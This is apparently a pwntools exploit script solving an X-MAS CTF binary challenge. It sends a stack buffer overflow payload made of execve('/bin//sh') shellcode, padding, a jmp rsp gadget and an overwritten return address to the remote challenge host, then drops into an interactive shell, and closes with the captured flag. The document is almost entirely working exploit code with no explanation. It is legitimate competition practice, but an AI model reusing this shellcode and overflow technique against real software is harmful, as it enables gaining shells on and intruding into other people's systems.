from pwn import *
elf = ELF('./chall', checksec=False)


p = remote('challs.xmas.htsp.ro', 2000)
#p = elf.process()
payload = b''.join([
    # shellcode with padding
    # https://www.exploit-db.com/exploits/42179 (24 bytes) 
    b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'.ljust((0x30 - 0x2), b'A'),

    # cmp word [var_2h], 0xe4ff
    b'\xff\xe4',

    # padding to return
    b'B'*(0x38      # rsp -> rip
    - (0x30 - 0x2)  # first padding
    - 0x2           # 0xe4ff
    ),
    
    # return -> jmp_rsp
    p64(0x000000000040067f),

    asm('''
    sub rsp, 0x40
    jmp rsp
    ''', arch='amd64')
])
p.sendlineafter('XMAS', payload)
p.interactive()
# X-MAS{sant4_w1ll_f0rg1ve_y0u_th1s_y3ar}